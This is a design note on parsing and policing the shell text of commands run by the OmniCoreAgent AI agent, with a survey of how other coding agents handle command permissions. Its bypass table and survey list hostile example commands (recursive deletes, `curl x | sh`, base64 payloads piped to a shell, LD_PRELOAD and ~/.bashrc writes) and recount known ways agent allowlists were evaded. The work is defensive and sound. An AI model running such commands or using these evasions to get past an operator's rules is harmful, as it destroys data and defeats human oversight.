# Policy on the text of a shell command: research and a design for OmniCoreAgent

Date: 2026-09-29. Scope: OmniCoreAgent 0.4.3, read from the repository at
`omnicoreagent-xml-discovery` (branch `main`, `eacb220`).

How claims are marked:

- **[code]**: read in our source. The file and function are named.
- **[sourced]**: from the cited page or source file, quoted exactly where quotation marks are used.
- **[ran]**: checked locally in a throwaway environment: `tree-sitter` 0.26.0, `tree-sitter-bash` 0.25.1, `bashlex` 0.18 and the stdlib `shlex`.
- **[inference]**: my own reasoning. Verify it before building on it.

---

## 0. The short version

- **What a rule can match today.** A policy rule matches the capability `process.exec`, the execution surface (`sandbox` or `host`), and `target.resource`. For the `execute` tool, `target.resource` is always `sh`. The command text is present at the governance boundary, in `SandboxCommandSpec.command == ["sh", "-c", <text>]`, but it is never parsed and never reaches the evaluator. So a rule cannot tell `git status` from `rm -rf /`.
- **What everyone else does.**
  - Every mature system that matches on the text (Claude Code, Codex, Gemini CLI, Roo Code) parses the text into sub-commands and matches each sub-command's argv.
  - They combine the results so that **any deny wins** and **allow needs every sub-command allowed**.
  - They **fail closed on anything they cannot parse** or statically resolve.
- **The honest limit.** Command-text rules are not a security boundary. Claude Code's docs say so explicitly. Codex removed its built-in "known safe" list in 2026. NVIDIA OpenShell does not match commands at all: it enforces in the kernel (Landlock, a seccomp notifier) and in a network proxy keyed on the kernel-reported binary. Denylists fail by construction, as the Cursor, Flatt and Tracebit bypasses show.
- **Recommendation.**
  - Add an optional `command` matcher to `PolicyRule`, holding `program`, `prefix` with alternatives, `args_any`, and load-time `examples`.
  - Parse `sh -c` / `bash -c` text with **tree-sitter-bash**. It is MIT, maintained, and the parser Gemini CLI and OpenHands chose.
  - Evaluate inside `sandbox/execution.py::_sandbox_authority_request`, the one place every command passes through, on the host and on every sandbox provider.
  - Keep the single `process.exec` request per command, with `resource: sh`. Every existing rule then behaves exactly as before.
  - Semantics:
    - any sub-command that matches a deny rule denies the whole command;
    - otherwise, any sub-command that matches an ask rule asks;
    - a `command` allow rule only applies if every sub-command is plain and matches some allow rule;
    - anything opaque (unparseable, dynamic program name, `eval`, pipe into a shell, and so on) can never be allowed by a command rule.

---

## 1. OmniCoreAgent today

### 1.1 The path a command takes [code]

1. **The model calls `execute(command=...)`.** In `core/tools/execution_tools.py:73`:
   ```python
   result = await scope.execute(["sh", "-c", command], timeout_seconds=limit)
   ```
   The tool call itself is first authorised as `sandbox.execute`, with target `tool_name="execute"` and `arguments_digest` of the args (`governance/capabilities.py::tool_authority_requests`). The dev profiles allow `sandbox.*`, so in practice this layer says yes.
2. **The scope passes it on.** `sandbox/scope.py::ExecutionScope.execute` calls `SandboxExecutionService.execute(SandboxCommandSpec(command=[...]), session=...)`.
3. **The service authorises it.** `sandbox/execution.py::_execute_in_session`, or `execute` for one-shot commands, calls `governance_engine.authorize_sandboxed(_sandbox_authority_request(spec, _surface(runtime)))`.
4. **The request is built from the command name only.** `_sandbox_authority_request` (lines 378–414) builds:
   ```python
   AuthorityRequest(capability="process.exec", provider="sandbox",
       execution_surface=surface,                        # "sandbox" or "host"
       target=AuthorityTarget(resource=command_name),    # spec.command[0] -> "sh"
       risk_level="high",
       metadata={"command": {"name": command_name, "argc": len(spec.command)}, ...})
   ```
   It **refuses** a caller-supplied request whose `target.resource` is not `spec.command[0]`.
5. **The runtime runs it.** Only after the decision does the runtime get `SandboxExecRequest(command=spec.command, authority=...)`.

The same service handles:
- the **`local` provider**, which runs on the host with surface `host` (`sandbox/local_process.py`);
- Docker, E2B, Modal, Daytona, Vercel and HTTP;
- **skill scripts**, from `core/skills/tools.py::_run_in_sandbox`, which call `scope.execute([*interpreter, relative, *args])` as a plain argv with no `sh -c`;
- **Harbor trials**, where `harbor/trial.py` inserts `allow_host_commands` on `process.exec` with surface `host`.

### 1.2 What a rule can match [code]

`governance/evaluator.py::_rule_matches` checks:
- `capability`, a glob via `fnmatchcase`;
- `conditions`: `risk_level`, `data_classes`, `provider`, `execution_surface`, `exclude_execution_surface`, `exclude_capability`, `mcp_server`, `method`, `host`;
- `target`: `path`, `host`, `resource`, `tool_name`, `mcp_server`, each a glob.

Precedence is fixed:
1. any matching deny;
2. then any matching ask;
3. then any matching allow;
4. then the mode default (permissive allows, interactive asks, strict denies).

For `execute`, `target.resource` is always `sh`, so these are the only command-related rules you can write:
- "all commands on surface X";
- "commands whose argv[0] matches a glob". That only helps skill scripts (`python`, `bash`, …) and direct `service.execute` callers.

### 1.3 Where the command text is [code]

| Place | Has the text? | Notes |
|---|---|---|
| `sandbox.execute` tool request | in `tool_args["command"]`, only as `arguments_digest` | The evaluator never sees the text. |
| `SandboxCommandSpec.command` in `SandboxExecutionService.execute` / `_execute_in_session` | **yes**, `["sh","-c",text]` | **The single choke point for host and all sandboxes.** |
| `AuthorityRequest.metadata["command"]` | no, only `name` and `argc` | `_safe_metadata` passes only allowlisted keys. |
| telemetry `sandbox_exec_*` events | text is in `input={"command": ...}`, a payload subject to the capture policy | Metadata keeps only `command_name` and `argc`. |

### 1.4 Two related findings to verify

- **An approval for a host command is not bound to the command text. [code, inference on impact]**
  - `core/run_approvals.py::request_digest` hashes capability, actor, target, provider, method, host, mcp_server, tool_name, tool_provider, tool_server, target_role and `arguments_digest`.
  - A `process.exec` request carries no `arguments_digest`, only `command.name`/`argc`, which are not in the digest.
  - So `sh -c "ls"` and `sh -c "rm -rf ~"` produce the **same** `process.exec` approval digest.
  - Recorded approvals are single-use (`status="used"`), so reuse is limited to one. A person who approves "run `sh`" from the approval record also cannot see the command there; they would have to look up the tool call by `tool_call_id`.
  - The design below adds a `command_digest`.
- **An auto-discovered allow rule is checked only by capability. [code, inference on impact]**
  - `governance/policy.py::_validate_auto_discovered_allow_rules` only checks that each auto-discovered allow rule's `capability` glob matches a baseline allow rule's capability.
  - A discovered `allow process.exec` with `execution_surface: host` passes, because the baseline allows `process.exec` on `sandbox`.
  - This is outside the scope of this note, but command rules will make allow rules more common in project files, so it is worth a look.

---

## 2. What other systems do

### 2.1 NVIDIA OpenShell [sourced]

Repo: <https://github.com/NVIDIA/OpenShell> (Apache-2.0), read at `main@9cb72baa`.

- **There is no command, argv or shell-text policy at all.** Binaries appear only as the owners of network connections.
- **Top level of the policy YAML** (<https://github.com/NVIDIA/OpenShell/blob/main/docs/how-it-works/policies/schema.mdx>): `version`, `filesystem_policy`, `landlock`, `process`, `network_policies`, `network_middlewares`. "OpenShell rejects a policy that contains unknown fields or duplicate keys."
- **Example:**
  ```yaml
  version: 1
  filesystem_policy:
    include_workdir: true
    read_only: [/usr, /lib, /etc]
    read_write: [/tmp]
  network_policies:
    github_rest_api:
      endpoints:
        - host: api.github.com
          port: 443
          protocol: rest
          enforcement: enforce
          access: read-only
      binaries:
        - path: /usr/bin/gh
  ```
- **Enforcement and when changes apply:**

  | Section | Enforced by | Takes effect |
  |---|---|---|
  | filesystem | "Landlock LSM in the kernel" | at startup |
  | process | the container runtime; only `run_as_user`/`run_as_group`, and root is rejected | at creation |
  | network | "Sandbox network proxy" (Rego via `regorus`) | live |

- **How connections are caught:** a seccomp user-notification listener "blocks external `connect` until the supervisor returns a policy decision".
- **L7 rules:**
  - `access: read-only | read-write | full`
  - `rules`/`deny_rules` on method, path and query: "A matching deny rule takes precedence over any allow, regardless of where either appears in the file."
  - For MCP: "Tool arguments are not matched."
- **Binary identity** (<https://github.com/NVIDIA/OpenShell/blob/main/docs/how-it-works/policies/network-rules.mdx>):
  - "OpenShell identifies each process by the real path of its executable, as the kernel reports it"
  - "A rule also applies to processes that a listed binary starts."
  - A SHA-256 of the executable is kept on first use, and later connections are denied if it changes.
  - From `sandbox-policy.rego`: "cmdline_paths are intentionally excluded — argv[0] is trivially spoofable via execve and must not be used as a grant-access signal."

**Lesson.** The vendor that builds the sandbox chose not to police command text. It polices effects (files, network), keyed on kernel truth. Command-text policy is a UX and intent layer on top of a boundary, not a replacement for one. For us, the sandbox surface already has a boundary; the host surface does not.

### 2.2 Claude Code [sourced]

Docs: <https://code.claude.com/docs/en/permissions>

- **Syntax and precedence:**
  - `"allow": ["Bash(npm run test *)"]`, `"deny": ["Bash(git push *)"]`, `"ask": [...]`.
  - "Rules are evaluated in order: deny, then ask, then allow… rule specificity doesn't change the order." An allow rule can't carve an exception out of a deny rule.
- **Wildcards:**
  - `*` matches any text including spaces; with no `*`, the rule is an exact match.
  - "`Bash(ls *)` requires a space after `ls`, so `lsof` doesn't match. `Bash(ls*)` … matches `lsof` too."
  - `:*` at the end is the same as ` *`, so `Bash(npm run test:*)` ≡ `Bash(npm run test *)`.
- **Compound commands:**
  - "The recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand independently."
  - "Deny and ask rules apply when any subcommand matches them, including a command nested inside a subshell, a command substitution, or a control-flow body such as a `for` loop."
  - `npm test &&`, where the operator has nothing after it, is treated as unparseable and not split, so an allow rule doesn't approve it.
  - "Yes, and don't ask again" on a compound command saves one rule per sub-command, up to 5.
- **Wrappers:**
  - `timeout`, `time`, `nice`, `nohup`, `stdbuf`, `command`, `builtin` and zsh `noglob` are stripped. Bare `xargs` is stripped; `xargs` with flags is not.
  - `watch`, `setsid`, `ionice`, `flock`, and `find -exec`/`-delete` "can't be auto-approved by a prefix rule".
- **Environment assignments:** "A deny or ask rule matches past any leading assignment, so `Bash(rm *)` in deny still matches `FOO=bar rm -rf tmp/`." Allow rules only skip known-safe variables.
- **Stated limits**, which we should copy into our docs:
  - "A Bash rule matches the command text Claude writes… isn't a security boundary around the program."
  - `Bash(rm *)` in deny does not stop `/bin/rm` or `bash -c 'rm …'`.
  - `Bash(git push *)` does not stop `git -C . push`, `git -c push.default=current push`, or `git 'push'`.
  - The curl-URL caveat: "Bash permission patterns that try to constrain command arguments are fragile."
  - "When Claude Code can't fully parse a command, it asks for approval… Commands longer than 10,000 characters always prompt."
- **Defence in depth:**
  - PreToolUse hooks can deny, ask or allow, but "Hook decisions don't bypass permission rules".
  - The OS sandbox uses Seatbelt on macOS and bubblewrap on Linux (<https://code.claude.com/docs/en/sandboxing>).
- **Past bypasses:**
  - CVE-2025-54795: `echo "\"; malicious; echo \""`, fixed in 1.0.20 (GHSA-x56v-x2h6-7j34).
  - CVE-2025-66032: eight ways around an argument blocklist, fixed by moving "from a blocklist approach to an allowlist approach" in 1.0.93 (<https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/>). See §4.

### 2.3 OpenAI Codex CLI execpolicy [sourced]

Repo: <https://github.com/openai/codex> (Apache-2.0), read at `main@c248f6d4`.

- **Rules are Starlark files** (`codex-rs/execpolicy/README.md`):
  ```starlark
  prefix_rule(
      pattern = ["cmd", ["alt1", "alt2"]], # ordered tokens; list entries denote alternatives
      decision = "prompt",                 # allow | prompt | forbidden; defaults to allow
      justification = "explain why this rule exists",
      match = [["cmd", "alt1"], "cmd alt2"],           # examples that must match this rule
      not_match = [["cmd", "oops"], "cmd alt3"],       # examples that must not match this rule
  )
  ```
  - `match`/`not_match` are "validated at load time (think of them as unit tests)".
  - Other builtins: `host_executable(name=, paths=[...])`, which says which absolute paths may fall back to a basename rule, and `network_rule(...)`.
- **Where rules live:** `~/.codex/rules/*.rules`, Team Config, and `<repo>/.codex/rules/`, the last only when the project is trusted. Rules approved in a session are appended to `~/.codex/rules/default.rules`. `codex execpolicy check --rules … -- <cmd>` tests a rule.
- **How decisions combine:** `enum Decision { Allow, Prompt, Forbidden }` and `matched_rules.iter().map(RuleMatch::decision).max()`, which is the "strictest severity across all matches (`forbidden` > `prompt` > `allow`)". Across all sub-commands of a split script, the max is taken; a sub-command matching no rule gets a heuristic decision that also counts.
- **Splitting `bash -lc` scripts** (`codex-rs/shell-command/src/bash.rs`):
  - Only `[bash|zsh|sh, "-lc"|"-c", script]` is recognised. The script is parsed with tree-sitter-bash.
  - It is split **only if** every node is in
    ```rust
    const ALLOWED_KINDS: &[&str] = &[ "program", "list", "pipeline",
        "command", "command_name", "word", "string", "string_content",
        "raw_string", "number", "concatenation" ];
    const ALLOWED_PUNCT_TOKENS: &[&str] = &["&&", "||", ";", "|", "\"", "'"];
    ```
    and no word contains `{ } * ? [ ] \ ~ ^ # $` or a backtick.
  - Subshells, `$(...)`, redirections, variable expansion, control flow, `&`, heredocs and `VAR=x cmd` all make the script un-splittable.
  - Then the whole `["bash","-lc","..."]` is one command. It matches only `bash` rules and otherwise falls to the unmatched-command logic, where the outcome depends on the approval mode and the sandbox.
- **Dangerous-command detection** uses a separate, permissive parser that "must not be used to prove that a command is safe". It flags `rm -f`/`--force`, recursing through `sudo`, `env`, `trap` and nested shells.
- **What Codex removed** (dates are commit dates):
  - The legacy typed `define_program` engine, with argument types `ARG_RFILES`, `ARG_WFILE`, …, removed in #32093 (2026-07-10).
  - Git from the built-in safe list, in #39524: "Repository configuration can cause even read-only Git commands to execute helpers, so Git command arguments alone are not enough to establish trust."
  - The whole `is_known_safe_command` list, in #39630 (2026-08-20). The last version had `find` unsafe with `-exec -execdir -ok -okdir -delete -fls -fprint -fprint0 -fprintf`, `sed` safe only as `sed -n Np`, and `rg` unsafe with `--pre`, among others.

### 2.4 Gemini CLI [sourced]

- **Legacy settings** (<https://geminicli.com/docs/tools/shell/>): `"tools": {"core": ["run_shell_command(git)"]}` and `"exclude": ["run_shell_command(rm)"]`, matched by prefix. The tool "splits commands chained with `&&`, `||`, or `;` and validates each part… If any part of the chain is disallowed, the entire command is blocked." `tools.exclude` is deprecated in favour of the policy engine.
- **Policy engine** (<https://geminicli.com/docs/reference/policy-engine/>):
  - TOML `[[rule]]` with `toolName`, `commandPrefix` or `commandRegex`, `argsPattern`, `decision = "allow"|"deny"|"ask_user"`, `priority`, `modes` and `allowRedirection`.
  - Priority is tiered: Default 1 up to Admin 5, plus `priority/1000`.
  ```toml
  [[rule]]
  toolName = "run_shell_command"
  commandPrefix = "git"
  decision = "ask_user"
  priority = 100
  ```
- **Implementation** (`packages/core/src/utils/shell-utils.ts`, `policy/policy-engine.ts`):
  - It parses with tree-sitter-bash (web-tree-sitter) and checks each sub-command.
  - It unwraps `bash -c` and re-checks the inner command.
  - It detects `$(`, backticks and `<(`/`>(`.
  - When parsing fails, a matching deny still applies; otherwise it falls back to ask (interactive) or deny.
  - "Redirection always downgrades ALLOW to ASK_USER."
- **Bypasses:**
  - Tracebit, July 2025: only the root command was checked, so `grep … ; <exfil>` with whitespace padding got through. Fixed in 0.1.14 by parsing the whole chain.
  - GHSA-wpqr-6v78-jr5g, April 2026: `--yolo` ignored the fine-grained allowlist. Fixed in 0.39.1.

### 2.5 Others [sourced]

- **Roo Code** (<https://roocodeinc.github.io/Roo-Code/features/auto-approving-actions>):
  - `"roo-cline.allowedCommands": ["git", "npm run", "echo"]` and `"roo-cline.deniedCommands": ["git push", "npm publish", "rm", "sudo", "*"]`, matched by prefix.
  - "Deny rules take precedence when their matching prefix is equally or more specific than the allow match (longest-prefix wins)." This is weaker than deny-always-wins.
  - Commands with dangerous substitutions (for example `${var@P}`) never auto-approve.
- **Cursor** (<https://cursor.com/docs/agent/security/run-modes>):
  - Modes: Auto-review (allowlist, then a sandbox, then a classifier), Allowlist, and Run Everything.
  - The denylist was deprecated in 1.3 after Backslash showed base64, subshell, script-file and quote-splitting bypasses (`"e"cho`): "For every command in a denylist, there are infinite commands not present in the denylist which have the same behavior."
  - Sandbox: Seatbelt on macOS, Landlock and seccomp on Linux.
- **Goose:**
  - Modes: autonomous (the default), manual, smart approval (an LLM judge plus MCP read-only annotations), and chat.
  - There is **no command allowlist or parsing**. Issue #11399 proposes regex allow/ask/deny rules with "most restrictive action wins" and per-sub-command evaluation.
- **OpenHands** (<https://docs.openhands.dev/sdk/arch/security>):
  - `LLMSecurityAnalyzer`: the model rates its own call as LOW, MEDIUM, HIGH or UNKNOWN. `ConfirmRisky` is the default. There are also regex analyzers.
  - It swapped **bashlex (GPLv3+) for tree-sitter-bash (MIT)** in PR #3237 (2026-05-19): "bashlex is GPLv3+ while this repo is MIT… unmaintained… crashes on a variety of valid shell constructs".
  - Its regression suite still marks command substitution and ANSI-C quoting as `xfail(strict=True)`, pending "a runtime-decode-or-fail-closed policy decision".
- **Cline:** the model sets `requires_approval` on each command. Settings are "Execute safe commands" and "Execute all commands". There is no rule language.
- **Aider:** `--suggest-shell-commands` and `--yes-always`. There is no allowlist. Commands go through its confirmation prompt, which is an inference from its options page.

---

## 3. Comparison

| System | What is matched | Rule syntax | Compound commands | Unparseable | Precedence | Enforcement point | Parser |
|---|---|---|---|---|---|---|---|
| **OpenShell** | not commands: files, network, binary identity (`/proc/<pid>/exe`, plus ancestors, plus a first-use hash) | YAML `network_policies.<name>.{endpoints,binaries}` | n/a | n/a | deny rules beat allow; rules add up | kernel (Landlock, seccomp notify) and an L7 proxy with Rego | none |
| **Claude Code** | text of each sub-command, prefix and `*` glob | `Bash(git push *)` in allow/ask/deny | split on `&& \|\| ; \| \|& &` and newline; deny/ask also inside `$( )`, subshells, loops | ask | deny > ask > allow, whatever the specificity | pre-exec in the harness, plus an optional OS sandbox and hooks | own shell parser |
| **Codex** | argv prefix with alternatives | Starlark `prefix_rule(pattern, decision, match, not_match)` | tree-sitter split only if plain; strictest decision across sub-commands | whole `bash -lc` is one command; mode decides | forbidden > prompt > allow (max) | pre-exec, plus an OS sandbox | tree-sitter-bash (Rust) |
| **Gemini CLI** | prefix or regex on the command; regex on JSON args | TOML `[[rule]] commandPrefix/commandRegex/decision/priority` | each sub-command; unwraps `bash -c`; redirection downgrades allow to ask | a matching deny still applies, else ask or deny | priority tiers | pre-exec | tree-sitter-bash (WASM) |
| **Roo Code** | command prefix | `allowedCommands`/`deniedCommands` | split into a chain | substitutions never auto-approve | longest prefix wins | pre-exec | own |
| **Cursor** | allowlist of commands; classifier | UI allowlist | not documented | falls to sandbox or classifier | allowlist only (denylist removed) | pre-exec, plus Seatbelt or Landlock | not documented |
| **Goose / Cline / Aider** | none (mode or model flag) | none | none | n/a | n/a | approval prompt | none |
| **OpenHands** | risk estimated by the LLM; regex analyzers | analyzer config | tree-sitter split | returned unchanged ("passthrough") | by risk threshold | pre-exec confirmation, plus container | tree-sitter-bash (Python) |
| **OmniCoreAgent 0.4.3** | `process.exec`, surface, `resource`=`sh` | JSON/YAML `deny/ask/allow: [{capability, conditions, target}]` | none | n/a | deny > ask > allow > mode | pre-exec in `SandboxExecutionService`, plus the sandbox boundary on the sandbox surface | none |

---

## 4. Bypasses and their mitigations

All the parser results in this table were checked with tree-sitter-bash [ran], except where marked.

| # | Bypass | Example | Why naive matching fails | Mitigation (who does it) |
|---|---|---|---|---|
| 1 | Chaining | `git status && rm -rf ~`, `git status;rm -rf ~`, a newline | a prefix `git status` matches the whole string | Split into sub-commands: every one must be allowed, any deny wins (Claude Code, Codex, Gemini after Tracebit). tree-sitter gives a `list` node [ran]. |
| 2 | Pipes into an interpreter | `curl x \| sh`, `base64 -d <<<… \| bash`, `echo cm0gLXJmIH4= \| base64 -d \| sh` | each part looks harmless | Treat a pipeline stage that is a shell or interpreter reading stdin (`sh`, `bash`, `zsh`, `dash`, `python -`, `node`, `perl`, `ruby`, `eval`, `source`, `.`) as **opaque**: never allowable, ask or deny [inference; Cursor/Backslash showed the base64 trick]. |
| 3 | Command substitution | `echo $(rm -rf ~)`, backticks, `<(…)` | the payload is inside an argument | Walk the whole tree: nested commands in `command_substitution`/`process_substitution` are sub-commands for deny and ask (Claude Code). Any substitution makes the outer command not allowable (Codex, Gemini, Roo). tree-sitter exposes it as `command_substitution` [ran]. |
| 4 | Quoting and escaping the program name | `\rm -rf /`, `r"m" -rf /`, `'rm' -rf /`, `""r""m` | a literal `rm` never appears | Resolve literal words to their shell value before matching: remove quotes and backslash escapes in `word`, `string`, `raw_string` and `concatenation`. tree-sitter reports `\rm` as the word text `\rm`, so we must unescape it [ran]. `shlex.split` already yields `rm` for both [ran]. |
| 5 | Absolute or relative path | `/bin/rm -rf /`, `/usr/bin/env rm …`, `./rm` | the name differs | Deny and ask match on the **basename**. Allow matches only a bare name or an absolute path in a standard system directory. A relative or unusual path (`./git`, `/tmp/git`) is never allowable (Codex `host_executable`; OpenShell uses real paths). |
| 6 | Nested shells | `sh -c 'rm -rf ~'`, `bash -lc "…"`, `env sh -c …` | the real command is a string argument | Recursively parse the `-c` argument when it is a literal, to depth 3. If it is not a literal (`sh -c "$X"`), it is opaque (Gemini unwraps `bash -c`; Codex's danger check recurses). |
| 7 | Wrappers | `sudo rm`, `env rm`, `timeout 5 rm`, `nice rm`, `nohup rm`, `time rm`, `stdbuf -o0 rm`, `command rm`, `builtin`, `exec rm` | argv[0] is the wrapper | Strip a fixed list of known wrappers, with their own options, and match the wrapped command (Claude Code's list). Wrappers not on the list (`watch`, `setsid`, `flock`, `ionice`, `docker exec`, `npx`, `mise exec`, `devbox run`) cannot be allowed by a prefix rule. |
| 8 | xargs and find -exec | `ls \| xargs rm`, `find . -exec rm {} \;`, `find . -delete` | the command comes from another command's output | Extract the command after `xargs [opts]` or `-exec/-execdir/-ok/-okdir … ;` as a sub-command for deny and ask. It is not allowable, because its arguments are dynamic. `find -delete`/`-fprint*` counts as a write (Codex, Claude Code). |
| 9 | eval, source, alias, functions | `eval "$(echo cm0=)"`, `. ./x.sh`, `alias ls=rm; ls`, `f(){ rm -rf ~; }; f` | the text is built at runtime | `eval`, `source`, `.`, `alias` and function definitions make the command **opaque**. A later call to a name defined in the same script is opaque [inference; Gemini issue #5495 is an `eval` bypass]. |
| 10 | Variables and expansion | `X=rm; $X -rf ~`, `${X}`, `$IFS` tricks, `${x@P}`, `~`, globs `/b?n/r?` | the program or arguments are unknown before runtime | If the program name contains any expansion or glob, the command is opaque. For allow, any `$`, glob or brace expansion in an argument makes the sub-command not allowable (Codex's word character check; Roo's `${var@P}`; Flatt #7 and #8). |
| 11 | Leading environment assignments | `FOO=1 rm -rf ~`, `LD_PRELOAD=/tmp/x.so git status`, `GIT_SSH_COMMAND=… git fetch`, `BASH_ENV=…` | the assignment hides the program, or changes what an allowed program does | Deny and ask match past the assignments (Claude Code). Allow does not apply when there are leading assignments, unless the rule names them in `env` [inference; Claude Code allows only known-safe variables]. |
| 12 | An allowed program runs code | `git -c core.fsmonitor=… status`, `git -C /x …`, `sed 's/x/y/e'`, `sort --compress-program sh`, `man --html=…`, `rg --pre=sh`, `git ls-remote --upload-pa=…`, `npm test` (runs package.json), `make`, `python -c` | the program is allowed, but its options execute other programs | Nobody solves this by parsing. The fixes are an **allowlist of exact prefixes, not argument blocklists** (Claude Code after CVE-2025-66032), load-time `not_match` examples, and a sandbox. Codex stopped trusting git in #39524. Document it as the core limit. |
| 13 | Redirection | `echo x > ~/.bashrc`, `git log > /etc/cron.d/x` | an allowed command writes a file | An output redirection (`>`, `>>`, `&>`, `>|`) to anything other than `/dev/null` or `/dev/std*` makes a sub-command not allowable unless the rule says `redirect: true` (Gemini's `allowRedirection`). tree-sitter gives a `redirected_statement` [ran]. |
| 14 | Heredoc bodies | `cat <<EOF\n$(rm -rf ~)\nEOF` | the body is expanded when the delimiter is unquoted | Walk `heredoc_body`. tree-sitter exposes the nested `command_substitution`; bashlex returns the body as a raw string. A heredoc fed to a shell or interpreter is opaque. |
| 15 | Hiding the payload from the approver | Tracebit: `grep …;` then 300 spaces then the payload; very long commands | the approval UI truncates | Show the approver the parsed sub-commands, not the raw string. Commands over 10,000 characters are opaque (Claude Code). Bind the approval to a digest of the exact text (§1.4). |
| 16 | Parser differential | the text is parsed as bash but run by `sh` (dash) or zsh; odd syntax; parse errors | the parser and the shell disagree | Any `ERROR` or `MISSING` node makes the command opaque. Refuse what cannot be proven (Codex's allowed kinds). Note that `execute` runs `sh -c`, which is dash in many images; tree-sitter parses bash, a superset for our purposes [inference]. Deny matching is best-effort, and allow is conservative. |
| 17 | Scripts written earlier | step 1 `echo 'rm -rf ~' > x.sh`, step 2 `sh x.sh` or `./x.sh` | no single command looks dangerous | Command rules cannot see this. Running a relative path or `sh <file>` is not allowable. Only the sandbox or filesystem boundary helps (Backslash's script bypass) [inference]. |
| 18 | Background and control flow | `rm -rf ~ &`, `for f in *; do rm $f; done`, `if …; then rm …; fi` | the command is nested in control flow | Walk the whole tree. Commands inside `for`, `while`, `if`, `case`, `subshell` and `compound_statement` are sub-commands for deny and ask (Claude Code). A sub-command inside a loop over a glob has dynamic arguments, so it is not allowable. |

---

## 5. Recommended design for OmniCoreAgent

### 5.1 Principles

1. **Command rules narrow an intent. They are not the boundary.**
   - Inside a sandbox, the sandbox is the boundary.
   - On the host, command rules are the main control, so the defaults there are conservative (ask).
   - The docs must say this plainly, as Claude Code's do.
2. **Deny and ask are best-effort, extracted from everything we can see.** A matching deny or ask anywhere in the tree applies, including nested and opaque parts.
3. **Allow must be proven.**
   - A command allow rule applies only if every sub-command is *plain*: a literal program, literal arguments, no expansion, no substitution, and no redirection to a file.
   - Every such sub-command must match some allow rule.
4. **Opaque never auto-allows via command rules.** Unparseable text, a dynamic program name, `eval` or `source`, piping into an interpreter, or a command over the size cap all fall through to the non-command rules and the mode default.
5. **No behaviour change for existing policies.** A policy with no `command` rules is evaluated exactly as in 0.4.3.

### 5.2 Rule fields

Add one optional field on `PolicyRule`: `command`. It lives on the rule, not on `TargetMatcher`, because it matches the parsed command, not a target string. It is valid only when the rule's capability glob can match `process.exec`; otherwise loading fails.

```yaml
deny:
  - rule_id: deny_recursive_rm
    capability: process.exec
    command:
      program: rm                  # basename glob, after unwrapping and unquoting
      args_any: ["-r", "-R", "--recursive"]   # any argument equals one of these;
                                   # short-flag clusters are expanded: -rf -> -r -f
    reason: Recursive delete is never allowed.
    examples:
      match: ["rm -rf build", "sudo /bin/rm -fr /", "echo $(rm -r x)", "find . -exec rm -r {} ;"]
      not_match: ["rm file.txt", "git rm -r --cached x"]

ask:
  - rule_id: ask_git_push
    capability: process.exec
    command:
      prefix: ["git", ["push", "send-pack"]]  # argv prefix; a list is a set of alternatives
    examples:
      match: ["git push", "git push origin main", "cd x && git push"]

allow:
  - rule_id: allow_git_readonly
    capability: process.exec
    conditions: {execution_surface: host}
    command:
      prefix: ["git", ["status", "log", "diff", "show"]]
      # optional: redirect: false (the default), env: [] (allowed leading assignments)
    examples:
      match: ["git status", "git log --oneline -5"]
      not_match: ["git status > /etc/x", "GIT_DIR=/x git status", "./git status"]
```

What each field does:

| Field | Meaning |
|---|---|
| `program` | glob against the resolved program basename |
| `prefix` | token list; each token is a string glob or a list of alternatives; matched against the argv prefix, with `argv[0]` compared as a basename |
| `args_any` | list of globs; matches if any later argument matches; short options are expanded |
| `redirect` | allow rules only |
| `env` | allow rules only: variable names allowed as leading assignments |
| `examples.match` / `examples.not_match` | parsed and evaluated against the rule itself when the policy loads (as Codex does); a failing example is a `PolicyLoadError` |

Notes on these choices:
- Examples are the cheapest guard against a rule that does not mean what its author thinks.
- No regex. Globs match the rest of the policy language (`fnmatchcase`). Gemini's `commandRegex` is powerful but easy to get wrong [inference].
- An option-aware `args_any` is needed because `prefix: ["rm", "-rf"]` misses `rm -r -f`, `rm -fr` and `rm --recursive`.

### 5.3 Parsing

**Parser: `tree-sitter` + `tree-sitter-bash`.** Both are MIT and ship binary wheels. py-tree-sitter 0.26.0 was released 2026-06-30, and both repositories were pushed to in 2026-08 and 2026-09 [sourced; licences read from wheel metadata, ran]. Gemini CLI and OpenHands use the same grammar.

| Parser | Licence | Verdict |
|---|---|---|
| `shlex` (stdlib) | PSF | A tokenizer, "short of a full parser for shells". With `punctuation_chars=True` it splits `&& ; \|`, but `$(rm -rf ~)` comes out as `'$','(','rm',…` [ran]. It is fine for turning argv strings in `examples` into tokens. It is not enough on its own, although a Codex-style "plain only" allow checker could be built on it. |
| `bashlex` | **GPLv3+** [sourced; PyPI classifier and README; ran] | Rejected. It is copyleft in our MIT package, unmaintained (last commit 2024-04), raises on `$((…))`, raises `ParsingError` on arrays (`a=(1 2)`) [ran], and gives the heredoc body as raw text, which hides substitutions in it. OpenHands dropped it for these reasons. |
| `tree-sitter-bash` | MIT | Chosen. A full tree, including `command_substitution`, `process_substitution`, `heredoc_body`, `redirected_statement`, `pipeline`, `list`, `variable_assignment` and control flow. Malformed input gives `ERROR` nodes (`root_node.has_error`), not exceptions [ran]. |

**How the dependency ships.**
- Make `tree-sitter` and `tree-sitter-bash` **core dependencies**, not an extra. Governance must not change meaning depending on what is installed [inference].
- If for any reason the parser cannot load and the policy contains `command` rules, loading the policy fails (fail closed), rather than silently ignoring the rules.
- `test_extras.py` needs no change. `test_complete_mediation.py` is unaffected, because parsing starts no process and opens no socket [inference].

**Output: a new module, `governance/commands.py`.** It is pure and has no I/O:

```python
@dataclass(frozen=True)
class SimpleCommand:
    argv: tuple[str, ...]          # literal words, quotes and escapes resolved
    program: str                   # basename of argv[0], after unwrapping
    path_kind: str                 # "bare" | "system_abs" | "other" (relative, /tmp/…)
    plain: bool                    # literal program and args, no expansion or substitution
    redirects_to_file: bool
    env_assignments: tuple[str, ...]  # names only
    via: tuple[str, ...]           # wrappers or nesting seen: ("sudo",), ("sh -c",), ("xargs",), ("$()",)

@dataclass(frozen=True)
class ParsedCommand:
    commands: tuple[SimpleCommand, ...]
    opaque: bool                   # can't prove what runs: parse error, eval, | sh, dynamic program, >10k chars
    opaque_reasons: tuple[str, ...]
    digest: str                    # sha256 of the exact text, used for approval binding

def parse_command(argv: Sequence[str]) -> ParsedCommand: ...
```

**Rules the parser follows:**
- If `argv` is `[sh|bash|dash|zsh, (-l)?-c, text, ...]`, parse `text`. Otherwise treat `argv` as a single `SimpleCommand` with no shell involved. This covers skill scripts.
